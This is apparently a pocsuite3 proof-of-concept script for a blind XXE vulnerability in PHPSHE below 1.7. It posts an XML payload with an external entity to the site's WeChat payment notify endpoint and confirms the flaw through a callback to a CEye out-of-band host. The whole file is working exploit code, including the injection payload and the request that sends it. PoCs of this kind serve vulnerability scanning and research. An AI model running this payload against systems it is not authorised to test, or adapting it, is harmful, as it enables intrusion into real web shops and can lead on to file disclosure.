# encoding: utf-8
# Author    : Sma11stu
# Datetime  : 2021/3/26 22:10
# Product   : PyCharm
# Project   : pocsuite3
# File      : phpshe_1_7_xxe.py
# explain   : 文件说明
from pocsuite3.api import CEye
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, POC_CATEGORY, OptDict, VUL_TYPE
from pocsuite3.lib.utils import random_str
from urllib.parse import urljoin

class DemoPOC(POCBase):
    vulID = 'xxx'  # ssvid
    version = '3.0'
    author = ['seebug']
    vulDate = '2021-03-26'
    createDate = '2021-03-26'
    updateDate = '2021-03-26'
    references = ['https://www.sohu.com/a/307805554_354899']
    name = 'phpshe xxe漏洞'
    appPowerLink = ''
    appName = 'phpshe'
    appVersion = '< 1.7'
    vulType = VUL_TYPE.XML_INJECTION
    desc = '''
        phpshe xxe漏洞
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE
    token = "xxxxxxxxxxxxx"    #ceye认证token

    def _verify(self):
        result = {}
        CEye_main = CEye(token=self.token)
        ceye_subdomain = CEye_main.getsubdomain()
        random_uri = random_str(16)
        logger.info("random_url为：%s" % random_uri)
        verify_payload = """<?xml version="1.0" encoding="utf-8"?>
                            <!DOCTYPE root [
                            <!ENTITY %% xxe SYSTEM "http://%s/%s">
                            %%xxe;
                            ]>""" % (ceye_subdomain,random_uri)
        logger.warn(verify_payload)
        veri_url = urljoin(self.url,"/include/plugin/payment/wechat/notify_url.php")
        logger.warn(veri_url)
        headers = {
            "Content-Type": "text/xml",
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        }
        try:
            resp = requests.post(veri_url,data=verify_payload,headers=headers)
            if CEye_main.verify_request(random_uri):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = veri_url
                result['VerifyInfo']['Payload'] = verify_payload
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)